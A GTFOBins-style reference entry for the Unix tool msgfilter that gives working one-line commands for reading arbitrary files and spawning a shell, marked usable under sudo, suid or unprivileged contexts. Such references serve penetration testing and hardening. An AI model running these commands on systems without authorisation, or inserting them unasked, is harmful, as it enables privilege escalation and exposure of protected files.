---
type: gtfobin
name: msgfilter
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# msgfilter

## file-read

```bash
msgfilter -P -i /path/to/input-file /bin/cat
```
_The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
```
_The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option._
**Contexts:** sudo, suid, unprivileged
